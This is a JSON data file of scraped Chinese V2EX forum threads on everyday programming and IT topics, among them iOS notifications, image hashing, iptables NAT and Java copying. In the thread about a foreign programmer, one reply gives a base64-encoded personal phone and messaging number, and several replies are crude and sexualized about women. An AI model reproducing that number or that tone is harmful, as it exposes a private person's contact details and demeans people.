{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>如题，问题是：如果我想取消这次的 APNS 推送，应该如何处理？</p>\n<p>我在程序里各种设置 body ， title ，等为空字符，依然不行，通知照常弹出。</p>\n<pre><code>self.contentHandler = contentHandler;\nself.bestAttemptContent = [request.content mutableCopy];\n\nself.bestAttemptContent.title = @\"\";\n//[NSString stringWithFormat:@\"%@\", self.bestAttemptContent.title];\nself.bestAttemptContent.body = @\"\";\nself.bestAttemptContent.subtitle = @\"\";\nself.bestAttemptContent.userInfo = [[NSDictionary alloc] init];\n</code></pre>\n<p>各位大牛是否有解决方案？</p>\n<p>至于，为什么会有这样的奇葩需求，是因为我们的客户端是安防类的，服务器推送的太多了，而如果服务器修改，那么智能安防设备的固件端也得修改，为了成本考虑，放在端上解决了。目前无法解决拦截取消 APNS 通知啊！如是问。</p>\n</div></div>"], "reply": "8", "tittle": "iOS 10 新出了 NotificationExtend，可以拦截 APNS 通知，中途修改后展现给用户。那么问题来了。。。", "comment": ["目测控制不了", " 好像是无法控制。", "说明服务器的同事不行 就这么简单", "用静默通知在后台唤醒，按需求 schedule 一个本地通知弹出来…", "服务器发送之前用 deviceToken 区分用户啊", "  每次推送都是针对不同用户的，因为通知是根据不同用户的家庭安防设备报警所发的。但是有的报警是不必要发的，比如人在家里，大白天，设备检测到是家庭成员，这个行为监测就不应该发报警通知。如果放在服务器有的逻辑不好控制，比如需要判断用户 Wi-Fi 的 SSIS 名称是否和设备链接的 Wi-Fi 一样，一样说明在家里，那么就不推送。而这个逻辑难以在服务器部署，所以放到客户端去做。", " 个人建议将需要推送的信息进行分类，对推送情况进行区分。比如：推送的频率、权重、推送发起的位置（服务器、客户端）。", "这后端也太懒了吧😄，如你所说的判断是否在家的问题。服务端两个字段的问题，逻辑部署在 app 端，变更通知逻辑不就得需要升级 APP 。感觉就像 bs 架构退步成 cs 架构了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>刚刚看了一下阮一峰老师的博文： 相似图片搜索原理 <a href=\"http://www.ruanyifeng.com/blog/2011/07/principle_of_similar_image_search.html\" rel=\"nofollow\">http://www.ruanyifeng.com/blog/2011/07/principle_of_similar_image_search.html</a> ，里面说到了一种很简单的图片相似计算方法，就是把一个图片压缩成 8x8 大小的小图片，对这 64 个像素进行遍历，取灰度平均值，每个像素点取和灰度值比较大小的布尔值 1 或者 0 ，最终生成一个 64 位大小的字符串作为其特征码。</p>\n<p>其实目前很多 pHash （ perceptual hash ）都是按照这种算法来定性一张图片，如果真的每张图片都对应一种这种算法的 pHash 码，世界上是不是永远最多只能存在 2^64=18446744073709552000 张图片？？？</p>\n<p>目前 github 了一遍都找不到更好的 pHash 算法， V2 们有没有好点的 pHash 算法示例，有 php 代码更好，谢谢</p>\n</div></div>"], "reply": "32", "tittle": "世界上是不是永远最多只能存在 18446744073709552000 张图片？", "comment": ["我毕业论文也搞了点图像，是结合应用那种的，我就随便说说\r", "\r", "很多图像检索的方法，尤其是比较老的，都是这样，把图像弄成一个向量，然后算欧氏距离来计算相似度。\r", "包括他文中说的 SIFT 也是搞成 128 维向量\r", "\r", "图片肯定是无穷无尽的，你如果使用更加”优秀“的算法，就会有更多的图像向量或者图像摘要\r", "\r", "我当时用的是词袋模型算法，   就是把图像提取 sift 特征，然后把特征点拿出来聚类，再用自然语言处理的方法，把特征点当做自然语言处理领域的 ”词“，然后搞倒排索引，就表示成向量了，最后通过欧氏距离来计算最近邻或者近似最近邻\r", "\r", "我记得还有一种算法 2016 年 CVPR 发的，人家只用了 16 位还是多少来着，但是算法很复杂，效果还可以。。。相似度也还不错", "只能说这种算法只能分辨这么多种吧。。。然后你这个数也不对啊？", "我前一阵子也研究了下图像识别,最近有项目了,就暂时搁浅了\r", "\r", "首先, 图片肯定是无穷无尽的......\r", "\r", "其次,还是有许多其他的算法的,http://www.ruanyifeng.com/blog/2013/03/similar_image_search_part_ii.html\r", "阮一峰老师的第二篇博文也讲解了其他算法\r", "\r", "最后,图像这块推荐下 opencv\r", "\r", "php 貌似不太适合把,用 python 或者 c++吧.opencv 对应的接口\r", "\r", "\r", "我也是刚学,代码什么的也是丑陋.随便看一看吧", "哈哈 我毕业论文也是关于这个的", "只是你那个分辨率只能存在这么多张图片吧？", "楼主这数学。。。\r", "一个图片按 640x 480 分辨率算，也就是这么多点，每个点的颜色可能取值为 255x255x255\r", "那么有多少种可能呢\r", "数量级都不对哦", "楼主最好好好理解下特征是什么意思，特征提取是有损的，而且损失信息量相当大\r", "举个例子来说，满屋的青蛙有一只狗，你说有个东西没戴眼镜，我一眼就能找出来是啥\r", "但是万千世界你让我同样找这条狗，恐怕这信息就不够用了", "散列是无限集对有限集，必然会有撞的啊。。", " #7 有点暴力…", "压缩成 8×8 大小的小图片\r", "取灰度平均值\r", "\r", "然后你会说只能存在 2⁶⁴ 张图片？", " ", " 这篇？", "\r", "\r", "实际项目中用于保存图片前 hash", " 保存图片前 hash 的话，对于滤镜处理或者降低分辨率的图片也能识别出来，这类图片的前 hash 也是一样么？求告知，谢谢", " 找了半天没找到我说的那个\r", "倒是找到师妹讲的一个老的。。。 ", "\r", "算了不管了", "啥样的脑洞能想出这种结论\r", "\r", "\r", "既然是 hash ，就肯定有碰撞呀", "这么大的数也不小了，放心吧，没有那么多图片的", " 蛤？暗中观察？", "瞧你说的，要是没有 hash ，是不是世界就不存在了\r", "hash 不过都是从无限集到有限集的映射罢了", "放心好了，要是不够了 hash 长度可以加的嘛。", " #7 青蛙为什么会有眼镜？太暴力了。。", "说到了一种（很简单）的图片相似计算方法，就是把一个图片压缩成 （ 8x8 ）大小的小图片，对这 （ 64 ） 个像素进行遍历，取灰度平均值，每个像素点取和灰度值比较大小的布尔值 1 或者 0 ，最终生成一个 （ 64 ）位大小的字符串作为其特征码。\r", "\r", "同理也可以说：\r", "\r", "说到了一种（稍微复杂点）的图片相似计算方法，就是把一个图片压缩成 （ 800x800 ）大小的小图片，对这（ 640000 ）个像素进行遍历，取灰度平均值，每个像素点取和灰度值比较大小的布尔值 1 或者 0 ，最终生成一个（ 640000 ）位大小的字符串作为其特征码。\r", "\r", "咦？世界上的图片变多了？（大雾）", " 老哥稳", "以图找图还是没法分辨细节的东西,我上传一页本子谷歌只能认出这是漫画", "肯定存在某个二进制排列，该数据为一张图片，其内容是你和[x]的交合场面（ x 可为任何人）。只不过这样的图片你还没找到", " 苟也有眼镜啊？！", "你知道 2^64 多大吗？", "恰巧和 IPv6 的地址数量一样多", "全世界只有 26 个英文单词？😷😷😷", "整个世界是不是只会经历 4294967296 秒？", " #29 对一般人来说可能是的，但有一个人例外", "如果一个系统采用 crc32 存密码，那么地球上只有 4294967296 种密码？", "我觉得在所有图像中，有意义的图片很少很少，听说（目前为止）不到 100,000,000,000 ，更别说 2^64 了。\r", "因此使用散列进行匹配是可行的，就像两个人指纹不太可能相同一样。"]},
{"content": ["<div class=\"topic_content\">有的时候抓包到一些链接，参数都是加密的，有些参数加密方式比较明显。有的参数乍一看不知道怎么加的密，不过能发出去基本都在 js 里面都能找到加密的方式，问题来了: 这些 js 在查看时参数，函数名都是单个字母字符。。还都是几千几万行的。这样的要怎么调试啊。或者有没有什么可以方便调试的浏览器插件推荐下呢。</div>"], "reply": "6", "tittle": "怎么高效的调试别人写的 js？", "comment": ["简单办法：找 .map 文件\r", "找不到就蛋疼了", "break on xhr", "如果是同事。。。让他自己调。。。", "生产环境都会把.map 阻止访问吧...当然不是所有人", "生产环境好像从没见过有人还把 map 文件放上去的，所以我基本上都是靠分析压缩后的代码，要么在适当的位置监听事件 or 断点。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><a href=\"https://pbs.twimg.com/media/C4hDb-vUMAAfM9h.jpg\" rel=\"nofollow\">https://pbs.twimg.com/media/C4hDb-vUMAAfM9h.jpg</a></p>\n<pre><code>.header-dark {\n  background-color: #1e2327;\n}\n</code></pre>\n<p>未登入状态时, 还是比较干净的. 登入后就成了黑的. 不知道大家的账号是不是这样的.</p>\n</div></div>"], "reply": "28", "tittle": "GitHub 这黑黢黢的导航头和 V2EX 以前的很像. 以我现在审美观来看, 丑.", "comment": ["要不要你们天天喊，我都没注意门头变了。", "真心不喜欢", "科技以换壳为本", "置顶栏变暗了而其他地方没有，感觉有点格格不入。", "修改 Github Banner 颜色 ", "我倒觉得无所谓吧，只是一张皮，不影响工作效率", "楼主是在养猫吗 ", " ", "无语了啊，我的 github 头像是黑色的，现在看不出来了=-=", "弄了个脚本, 不会闪\r", "寓意着 github 要开始黑化了", "为了完成今年的 kpi, 换个主题颜色而已嘛", "不美丽了", "stylish.....", "村通网", "Google 也不是改成了硬又黑了嘛...", "我都忘记原来的颜色了.....", "就像 Ide 的黑色主题一样就是新鲜，实际上光线好的地方看着眼睛累，肯定不止我一个", " 说得还挺有道理。\r", "\r", "题主不说，还没发现。确实不太好看，生硬。", "从白软变成巨硬", "只有我觉得好看么", "自己的头像也是黑的，改了以后，伸手不见我的头像了……", "为什么不让标题栏根据项目的语言来变化呢？", "说明你们是黑户！", "关键是对比度调教太差\r", "\r", "内容和导航之间对比奇高无比，同时搜索框和里面默认文字对比度又特别低", "我喜欢", "GitHub 换成黑底白字，却没有调整字重……怎么也得换个更粗的字体啊。", "没事，今天整个调色板都变丑了。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>达到深复制的效果</p>\n</div></div>"], "reply": "12", "tittle": "Java 中有直接 copy 内存的 api 吗？", "comment": ["没有, 但是你可以用个取巧的方法, 如果不想实现 cloneable. 用序列化跟反序列化, 但是有个缺点, 就是里面所有对象都要支持序列化.", "clone", " 这些我知道，昨天去面试有人提过这么一句，说有相关的 api ，我以为是 java8 中新增的，就没多问。结果 google 了下，没找到相关的东西", " 原生方法拷贝内存的，我只知道 Arrays 里面有个 copyOf 底层实现是本地方法，其他就不清楚了。", " 翻了一下源码，底层用 system.arraycopy ，感觉可以用这个做深拷贝", " 这个只是数组拷贝吧，不能实现对象的拷贝。感谢！", "org.apache.commons.lang.SerializationUtils.clone(object)\r", " 这个？", "上面这个应该也还是要实现序列化接口\r", "可以试试用 PipedInputStream 和 PipedOutputStream 来实现内存 copy", "sun.misc.Unsafe.copyMemory?", "我猜他想考你的是 Prototype  模式。", " \r", " \r", " 他问深复制，我说了几种方法，然后他说知不知道 java 中有直接拷贝内存空间的 api ，我想了下说没接触过。他又提示说 lang 包下的。然而我现在还没找到", "我觉得他应该是搞错了。 Java 不能直接操作内存，操作内存要直接或间接的使用 JNI 才行。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>编辑的时候是降</p>\n<p><img alt=\"Imgur\" src=\"http://i.imgur.com/N5oJpMA.png\"></p>\n<p>播放和下载就变宋体了</p>\n<p><img alt=\"Imgur\" src=\"http://i.imgur.com/uGfFbJi.png\"></p>\n<p>这种有办法处理不？</p>\n</div></div>"], "reply": "2", "tittle": "Google Slide 简体中文播放/导出的时候变成宋体", "comment": ["1 字体选 Arial 吧，至少保证汉字能是 Sans-serif 输出……\r", "2 下载的 PPTX 文件我并没能重现这个问题，但是下载的 PDF 里看到的貌似是只嵌入了 MS PGothic 日文字体和宋体，并没有嵌入先前选择的字体（雅黑啊正黑啊仿宋啊什么的）。\r", "3 如果问题解决不了，是不是可以试一下 Microsoft 提供的 Office Online 免费工具，应该对 PPT 支持更好一些吧……", "看来是 Fallback 出错。"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>各位大大们，有谁用过枫叶主机吗？体验如何？</p>\n<p>ps ：现在还有优惠码吗？</p>\n</div></div>"], "reply": "13", "tittle": "求枫叶主机优惠码", "comment": ["不错，推荐，性价比很高\r", "\r", "我这个半成品就是搭建在枫叶主机上\r", "之前在他家买过 SS 和 VPS ， SS 半年付， VPS 月付，后来 SS 不用了，到期收到邮件以为是 VPS 的就续费了，我和客服说我 SS 不用，交错了，他们各种强硬不给取消，我说我续的是一个星期之后才开始的，为什么还没有使用的服务也不能取消，人家就直说不能取消，都不给你说理由的，简直了，果断换 linode 了。", " 都说他妈家客服态度傲慢还傻逼", "表示没有 ", "可以试试锐壳~~", " 锐壳不要想了。技术渣。共享资源，他不会限制单独虚机的资源，而是不管你，等你超了，占的多了，一禁了之。然后等你自己解决问题。啥时候解决啥时候解封", "占楼求一个 godaddy 的域名优惠码 0 0", "我只能说垃圾", "枫叶其实还行，我自己有一台 VPS 在上面，平时没出过什么问题。\r", "和客服的交流仅限于开工单，没见过一句废话，回复和处理的速度还是可以的。\r", "优惠码的话，去看看其他的测评站，或许会有合作优惠码。\r", "\r", "我就不贴 aff 了（逃", "香港 KVM VPS 测评：枫叶主机 1GB 内存 KVM 香港 CN2 简单测评 ", "\r", "\r", "优惠码： 2017host （优惠 30%，适用于虚拟主机、 vps ）\r", "优惠码： 2017ss （ SS 加速服务 9 折优惠码）", "主机壳&Hostker 不贴 aff 了，搜索一下就有。", " 过期了，好可惜", "经常自动关机，已弃坑"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p><img alt=\"picture1\" src=\"https://ooo.0o0.ooo/2017/02/17/58a6e8e637ebf.png\">\n<img alt=\"picture2\" src=\"https://ooo.0o0.ooo/2017/02/17/58a6ea000c62e.png\">\n服务下面的有 PID 这一列，而 PID 不就是进程序列号吗？\n那<strong>进程</strong>和<strong>服务</strong>有什么区别？</p>\n</div></div>"], "reply": "13", "tittle": "window 7 任务管理器中进程和服务的区别", "comment": ["一个字段在一个表是主键，在另一个表是外键，那这两个表有什么区别？", "服务运行以后就是进程，就和普通程序一样，但是服务是比较重要的一些进程", "服务是系统级的，进程是应用级的", "公交车也是车，你说呢？", "整套系统就像一辆公交车，进程是座位和扶手，服务是司机，硬件就是车，座位让你能舒服得坐车，扶手让你不会因为惯性而摔倒，一辆公交车要是没座位，大不了站着，没扶手了大不了摔跤，但是没司机，车就没法开了，虽然乘客和司机都是人，对车而言都是一样的，但是其中的角色却是不同的，有相互依赖关系。", "进程属于用户，服务属于系统。", "服务是 `systemctl --all`\r", "进程是 `ps -e`", "区别大了。自己去看《 Windows 核心编程》吧。", "简单的理解：\r", "\r", "提供了服务接口(启动停止暂停重启)并注册到系统的程序是服务。\r", "\r", "服务是程序，但是只有符合上面条件的程序才是服务。\r", "\r", "由于服务也是 exe 程序，那么它启动的话就和普通 exe 一样是一个进程。\r", "\r", "\r", "我记得实际有各种特立，不过那是小节。", "由进程提供服务。", "服务好像不能和桌面交互", "服务也是 exe ，，启动以后也是一个进程的形式。\r", "\r", "不同的是，服务有特权，有些 windows 信息和 windows32 api 是只有服务才能调用的。\r", "\r", "任务管理器的服务右键还能停止启动重启等", "服务是能被单独管理的一类进程\r", "这些进程和系统有特殊的接口进行互动的\r"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>使用 JenKins 配置 iOS 自动化打包，构建版本时，报：\nFATAL: Cannot find xcodebuild with the configured path /usr/bin/xcodebuild.\nBuild step 'Xcode' marked build as failure</p>\n<p>多方 Google 后还是找不到解决。\n工程中使用了 cocoapods ，怀疑是 Advanced Xcode build options 配置的问题， JenKins 版本是 2.4</p>\n<p><a href=\"http://stackoverflow.com/questions/31404884/building-ios-project-with-jenkins-on-ubuntu-linux\" rel=\"nofollow\">http://stackoverflow.com/questions/31404884/building-ios-project-with-jenkins-on-ubuntu-linux</a></p>\n<p><a href=\"https://shinesolutions.com/2011/06/23/ci-with-jenkins-for-ios-apps-build-distribution-via-testflightapp-tutorial/\" rel=\"nofollow\">https://shinesolutions.com/2011/06/23/ci-with-jenkins-for-ios-apps-build-distribution-via-testflightapp-tutorial/</a></p>\n</div></div>"], "reply": "2", "tittle": "JenKins 配置 iOS 自动化打包时报 FATAL: Cannot find xcodebuild with the configured path /usr/bin/xcodebuild.\r\nBuild step 'Xcode'", "comment": [" , Jenkins ， K 大写了好难过。。。\r", "\r", "不确定你的问题是怎么回事，建议通过先输出 envrionments 的方式确定一下你 Jenkins build 的那个 session 里面环境变量是怎么设置的。\r", "\r", "有些奇怪的问题是因为 jenkins node 的登陆用户没有 load 到个人配置的环境文件造成的。", " 这个或许是服务器配置的环境问题，装了 Docker 后再试一试。 Jenkins JenKins 对比一下真的好难受啊！"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>我搞了个软路由，<br>\neth0 是 WAN 口，也就是上行链路<br>\neth1 是 LAN 口，开启 DHCP 开启各项服务， 192.168.3.233<br></p>\n<p>网上教程让开启 NAT 输入下面一句话：</p>\n<p>iptables -t nat -A POSTROUTING -s 192.168.3.0/24 -o eth0 -j MASQUERADE</p>\n<p>游戏电脑接了 eth1 ，现在可以正常上网，没什么问题</p>\n<p>可是我有个疑问：<br>\n比如我的 DNS 请求，是不是也要通过 NAT 从 eth1 转到 eth0 才能响应呢？</p>\n<p>那如果有些服务我不想在 eth0 上，我就不想让 eth1 给我做 NAT ，那个 iptables 规则怎么写啊？</p>\n<p>我不知道是走 filter 的 forward 还是走 nat 表的  prerouting</p>\n</div></div>"], "reply": "6", "tittle": "怎么写才能让 iptables 的 nat 不转发我的某些请求", "comment": ["怎么说呢，你的 dns 请求是外部的话，肯定走 nat ，当你请求是内部的话压根就不过 nat 表，你去看看表链的图示，理解一下就知道了。想重定向的话是 dnat ，在 nat 表的 prerouting 做。", " 我的网关上 53 端口就开了一个 dnsmasq  ，它自己又请求了一个上游的 chinaDNS\r", "\r", "您的意思是如果请求的就是 网关地址本身，是不走 NAT 的对吧", " \r", "好像确实是这样\r", "\r", "C:\\Users\\ruirui>tracert 192.168.3.233\r", "\r", "通过最多 30 个跃点跟踪到 192.168.3.233 的路由\r", "\r", "  1     5 ms     4 ms     4 ms  192.168.3.233\r", "\r", "跟踪完成。\r", "\r", "C:\\Users\\ruirui>tracert 8.8.8.8\r", "\r", "通过最多 30 个跃点跟踪\r", "到 ", " [8.8.8.8] 的路由:\r", "\r", "  1     5 ms     4 ms     4 ms  192.168.3.233\r", "  2     5 ms     5 ms     5 ms  192.168.2.1\r", "  3     6 ms     5 ms     7 ms  192.168.1.1", " 你请求的是 192.168.3.233 的 53 端口， prerouting 过后，就是路由判断，请求是本机，就进入本机 input 了，不是本机，就是去 forward 了", "你的命令里不是写着-s -o 么？", "首先你要知道，“是否转发”不是 NAT 控制的，而是 FILTER 控制的"]},
{"content": ["<div class=\"topic_content\">本人是外国人，来中国 8 年了。毕业之后最好 3-4 年一直在一家小的贸易公司做所为的“综合经理”吧，因为责任很多：跟外国客户沟通，安排物流发货，管理几个客户业务员，采购，同时给公司开发了比较简单的 ERP+CRM 系统，网站， ios 应用，平时会维护下服务器。之前没有什么 IT 技术但这几年学到了不少知识：前段开发， java ， swift ， go ， linux 什么的。感觉天天做这么多不一样的工作有点累而且还喜欢上了编程。\r<br>目前在想要不要换个工作，做一个真正（全职）的程序员。但又不知道从哪儿入手，是否能找到薪资比较合适的职位呢？会不会融入中国 IT 人的圈子里呢？\r<br>大家有没有什么想法或者建议呢？</div>"], "reply": "163", "tittle": "小老外在国内做程序猿好吗？", "comment": ["实在不行，找找相关对应贸易的兼职嘛，至少你比别人更了解你的国家，咦，好像说偏题了。\r", "我不是码农，所以感觉就是你现在在这家贸易公司做了整个 IT 部门的工作\r", "94 年小生，好年轻啊", "不得不说，对楼主很服气。\r", "\r", "楼主真挺厉害的，一个人做这么多，而且是非 IT 公司里面，挺不容易了，想来这些应该全都是自学的，真是可以的。\r", "\r", "找大一点的公司吧，机会多，也有更多的可能。", "如果你在北京，而且技术过硬的话，我想我这里可能会有一个不错的机会提供给你。", "我自动脑补了 安满力 的配音阅读这个帖子.", "你条件如此好，考虑移民天朝吧！", "我觉得特别好，千万别移民，别买房，就对了！", "好有意思的人。", "中文写得很 6 ，莫非是华裔。。。", "可以去外企", "好厉害的中文", "中文 666\r", "\r", "不过无论老外还是中国人，业余兴趣写代码一回事，全职写代码又是一回事", "你是不是假老外？\r", "\r", "还有你英语过 4 级了吗？", "很有意思的一个人", "大家的起的这么早。太阳都没开始晒我屁股就来了这么多个回复 谢谢你们关注我的主题 :D\r", "\r", " 我想能不能适应新的工作，薪资会不会比以前低呢。还有一点，我现在工作时间是自由的，但周六周日也的工作。\r", "\r", " 嗯 最近找到了一个 mentor 学点 enterprise java ，提高自己水平。同时也发现了 golang ，准备把公司的一些 microservice 用它来重新编程下。我也建议你看看 server-side swift 哦。\r", "\r", " 欢迎光临 :)\r", "\r", " 我觉得我工作方面比较稳定，毕业出来第一份工作做到现在了却旁边好多朋友已经换了好几份工作还每年问我“你还在那家公司啊？不无聊吗？” 哈哈\r", "\r", " 目前还在北京可是今年公司派我去国外开发新市场。好像留下，舍不得离开北京 😢。要是回来找你哦 帮我介绍下这个 thoughtworks \r", "\r", " 我是老司机，当然知道啦 😄", " 90 年。因为来中国上本科前要学 2 年的中文比别人晚了点\r", "\r", " 刚来这家公司老板说是需要搞个网站（之前是没有的），这样我就走上了这个 IT 的歪路 。我很多朋友说小公司跟大公司相比之下容易发。\r", "\r", " 好好奇啊 \r", "\r", " @", " 想移民过来但是目前只有 5000 多个外国人拿到了。。。 ", "\r", "\r", " 不知道什么是 4 级。很久之前考过 toefls", " 好难，难道我是外国人，我自己却不知道？", "外国人来中国做 IT 个人感觉应该非常好，首先英语这是个硬功夫英语好开发就是比较水道渠成的事大公司对英语要求很高这让很多喜欢开发但英语不好的中国人比较悲伤了，而且外国人我觉得在中国还是比较吃香的比中国人想要融入中国人的圈子都轻松的多，如果你以前从事金融其实可以尝试 Business Analytics", "厉害了，加油哈哈，不过不建议你转程序员，赚的没你现在多的", "从目前来看，可以不用转行， it 里面能拿 35k 的估计没你现在自由", "中文说的 6 啊", "好棒棒呀！", "兴趣最重要，如果真想转程序猿，以楼主的经验完全可以考虑做全栈工程师啊，要是想专精的话建议服务器开发，跟楼主的经验比较搭", "中文学到这个程度，好厉害，回国搞政治，然后派你来做驻华大使、领事馆之类的工作适合你，然后每日泡吧随便日便北上广妹子。", "仅仅凭英语这个能力，楼主已经可以打赢一大批国内程序员了。", "在上海么？在的话可以来我们团队试试，外企，开发部有很多老外，工作氛围比较开放。", "别说那么多实话，先拉入坑再说", "敢情兄弟是战斗民族啊", "我认识一个以色列女程序员，在上海一家中国公司，除了她都是中国人(我从照片推断)，不太会说中文，但是能听懂很多。", "你这中文水平比我还 666666 ，是‘老外’么", " 我和俄罗斯人、哈萨克斯坦人玩杀人游戏都只用俄语和汉语的，东方（俄罗斯、各种斯坦）国家外国人（留学生）汉语比英语说得好是正常的。", " 表面上中国人好奇外国人，但交往再深了就不容易了。尤其 OP 这类亚洲面孔，对国人吸引力大大降低。\r", "\r", " 我的一位朋友正好相反，不能接受南方菜，平时吃西餐（但很想念俄罗斯食物，我也一样），可以吃北方菜。不过工资高了之后想吃什么相对都容易些。虽然特色的不太容易找到（шаурма и шашлык ;) ）。\r", "和哈萨克斯坦、俄罗斯人在一起时我开玩笑说我是阿塞拜疆人，通常能蒙混过去。不主动提时会被误认为韩国人……\r", "移民：你可以长时间在这里居住，但不一定需要拿到绿卡。同种族聚集区里生活相对还不是太难，尤其是泛俄种族很容易找到同胞也好相处。\r", "另外如果你英语不错的话，试试换个地方英语发帖，回帖的中的某些怀疑你的人对你的态度会有微妙的变化。", "楼主真是厉害，我服", "如果你在北京的话，可以简单写一份简历投出去试试，看北京的 IT 公司能给你的薪资是否比你目前的薪资高。这样可以得到最可靠的结果。\r", "\r", "另外：\r", "\r", "1 、中国的绿卡不好拿，中国国籍也不是那么容易加入的。而且除非被公司聘用，否则很难拿到工作 Visa 。毕竟中国有数量众多的 Nationalism ，习惯于做“天朝上国”的美梦，不会支持任何程度上的开放。作为普通外国人在中国工作和生活比中国本国国民要困难很多（很多中国人体会不到这一点，但其实只要假想一下所有需要身份证才能使用的服务都变得统统不可用就知道了）。\r", "\r", "2 、中国国内的 IT 圈子应该是比较开放的，但是如果有更好的机会，还是去尝试更好的那个机会。中国不是一个理想的投资地，毕竟： A ）法律意识还不健全，合同在很多情况下跟没有一样； B ）政策也不稳定。但是在中国赚钱是可能，因为市场大，机会相对多。", "北京的酒吧都泡过了，哪里的妹子好约些（逃", "先说一下软件开发行业的情况，目前在中国，不分地域，无论是大公司还是小公司，无论是有钱的公司还是没钱的公司，月薪 20K 已经是软件工程师的顶薪行列了，再往上，基本上只能是有钱公司（往往是互联网行业（包括移动互联网，手机 APP 相关等），但这两年泡沫挤了些，薪资已经相对回归理性，烧钱的时候过去了）的高级职位了，你希望的 35K ，估计有点玄，而且你是“给公司开发了比较简单的 ERP+CRM 系统”，要知道，以 ERP 为代表的传统软件开发的工资比互联网开发要普遍低一截的，而且你开发的是简单的。\r", "\r", "很认真的建议：\r", "不要辞掉你目前的工作，可以去先投一下简历，试一下水，保证不吃亏，你将会感受到水是多么的深，竞争是多么激烈，我还是建议你把软件开发作为副业，这样还可以保持编程为爱好。", " 除了信用卡不好办之外，其他好像用护照问题都不大", "孩子，孩子为何你这么傻？目前工作不好吗？又能赚钱，写代码做为兴趣比较好，真正做 码农压力很大，工资还不一定能到你想要的。", "首先，我在想要是中国人发这么一个帖子 会不会有这么多人回复 回复的是不是这么冷静 - -!!\r", "其次，小老外，你中文好好 - -!!!\r", "再者，想干就去干吧， IT 领域其实挺纯粹的，别纠结太多。", "楼主,说真的,你这中文水平都可以去当语文老师....", "小老外，萌萌哒，我看能行~哈哈哈", "我们公司的老外不用交税。工资老高了。不过都是运营。", "哪个大学毕业的楼主兄弟？@amanbolatbalabek", " 可惜 我们国家腐败很厉害。没有亲戚是公务员的话根本不要考虑在政府工作\r", " @", " 在国内做 IT 英文那么重要么？从来没把应为作为一个优点\r", "\r", " 一直在北京\r", "\r", " #131 呵呵 如果是俄罗斯人话一般想念奶渣饺子（варенники с творогом），哈萨克斯坦人就喜欢肉烩面(бешпармак)。在中国几乎都是韩国人，法国人一起玩，很少接触同胞\r", "\r", " 好建议哦，有时间去面试 呵呵。 1 ）你还真理解在国内没有身份证是什么一个体验。\r", "\r", " 这个嘛 现在也不记得了，我已婚 :)\r", "\r", " 谢谢你这么详细的回答！\r", "\r", " 我发现了中国对外国人好热情啊！这方面没有一个国家的人能比得过中国人！\r", "\r", " 对外经贸大学 会计专业", "这个。。。围观一波", " 奶渣饺子这儿的俄罗斯人不经常做，在俄罗斯我也从来没吃过，也没看到别人吃过😃不知道是不是原材料不好买，还是这道菜难度太高。平常会做奶酪土豆焗鸡肉，或者是馅饼(блины?希望没拼错)，好吃不贵又好做。\r", "还有一点，有些西餐厅做出的东西和当地的，家常的味道差距很大。这种食物比吃中餐还会越吃越想家😂", "建议考虑清楚转行做程序员能否发挥身为外国人的优势，以及今后如果回国发展的话程序员是否适合自己", "server-side swift 你已经用在项目上了吗", " 已经用上了，但用的地方暂时不多", "中文确实厉害！但是还是要学习一个，「呵呵」这个词要少用，现在在中文里这个词表示的意思不是很好 😂", "“呵呵” 这个词在年轻一代里有演变出 冷笑、不屑的意思", "觉得维持现在的工作 试试往想去的公司投投简历 看看要求 学习自己感兴趣的吧 你这 35k 改行的话未必拿的到 而且你有这个中文水平 做别的可能都会比搞开发更好发展 不过还是看你兴趣 毕竟我们都还年轻", "哈萨克斯坦？怕毛，一看就是自己人，可劲转。", "讲真，没身份证在国内找 IT 工作还是会遇到不少问题的。骑牛找马，先别辞职，确定了下一站之后再辞。程序员的工作只是一般有趣而已，喜欢就上。\r", "对于外国人来说，中文还真 6 ，交流已完全没问题，加上英文好，在国内已是个优势。还有中国的程序员还是比较开放的，并不排外，融入并不难。", "小老外。。。", " 学习了 🙏\r", "\r", " @", " 看这么多人这么说。看来真的是要把编程作为自己的爱好算了，继续好好工作赚钱买房买车😊\r", "\r", " 等等到了 40 多岁改成大老外 哈哈😄", "我纯属是来围观的，好有意思。", "好厉害！我们公司也有一个外国同事做安卓开发。", " 平时主要在北京哪个区域出没啊？", " 一般都在回龙观或者建国门", " 我是从业十年的前端工程师，目前主要在朝阳安贞片区出没，有兴趣交你这个朋友，有时间且有兴趣的话可以约着见面聊聊，让你了解一下全职程序员的职业生涯，顺便也满足一下我的好奇心，哈哈", " 好啊，好啊，怎么联系你呢？有时间可以出来喝咖啡。", "  window.atob(\"VGVsL1dlQ2hhdC9RUTogMTg4ODMxMzg1MDY=\")", " \r", "大舅去二舅家找三舅说四舅被五舅骗去六舅家偷七舅放在八舅柜子里九舅借十舅发给十一舅工资的 1000 元。\r", "问： 1 、究竟谁是小偷？\r", "2 、钱本来是谁的？"]},
{"content": ["<div class=\"topic_content\"><div class=\"markdown_body\"><p>https://ooo.0o0.ooo/2017/02/17/58a66a6815220.png</p>\n<p>平时打中文喜欢用 notepad++\n但是它的控件样式丑爆了(个人认为)，还是上世纪的 3d 凸起风格，最新版的已经可以在设置菜单里设置编辑框不凸起了，然而 tab 栏的凸起，依然难以忍受，于是打算用修改样式重编译的方式把凸起拍扁，那么 tab 栏这个凸起属性能直接设置不凸起吗?(原谅我不太懂 win32 的 tab 控件)</p>\n<p>源码地址： <a href=\"https://github.com/notepad-plus-plus/notepad-plus-plus\" rel=\"nofollow\">https://github.com/notepad-plus-plus/notepad-plus-plus</a></p>\n</div></div>"], "reply": "6", "tittle": "win32 的 tab 栏控件可以拍扁吗？", "comment": ["同需求，楼主找到方法 AT 我下。", " 修改创建时的样式 然后自己编译构建。", "r#2 @", " 感谢回答 但是没有效果？ 在这里试了几个样式都是这样\r", " \r", "\r", "注释这一行\r", "\r", "\r", "和\r", "\r", "到\r", " 共三行\r", "\r", "可以实现扁平效果，关闭按钮就没有了。\r", "\r", "r#4 @", " 感谢你的帮助。\r", " 方法来拉", "Tks"]},
